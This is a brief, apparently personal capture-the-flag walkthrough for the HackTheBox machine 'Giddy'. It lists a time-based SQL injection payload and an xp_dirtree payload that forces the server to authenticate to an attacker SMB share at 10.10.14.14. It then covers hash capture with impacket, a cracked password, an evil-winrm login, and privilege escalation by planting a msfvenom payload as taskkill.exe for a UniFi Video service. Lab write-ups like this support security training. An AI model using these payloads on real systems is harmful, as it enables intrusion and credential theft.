in mvc directory we found https://giddy.htb/mvc/Search.aspx
when we use this payload we get sql injection ' if (select user) != 'sa' waitfor delay '0:0:5'--
after this we generete this payload
'+EXEC+master.sys.xp_dirtree+'\\10.10.14.14\share--
and add this in post inject parametr in burp suite
![[Pasted image 20250206211634.png]]

sudo impacket-smbserver share ./ -smb2support
![[Pasted image 20250206211710.png]]
cracked password: xNnWo6272k7x

we login with evil-winrm

then we found https://www.exploit-db.com/exploits/43390
create taskkill.exe file with msfvenom and add this file to
C:\ProgramData\unifi-video\
and run this command
Stop-Service "Ubiquiti UniFi Video"

use msfconsole exploit/multi/handler
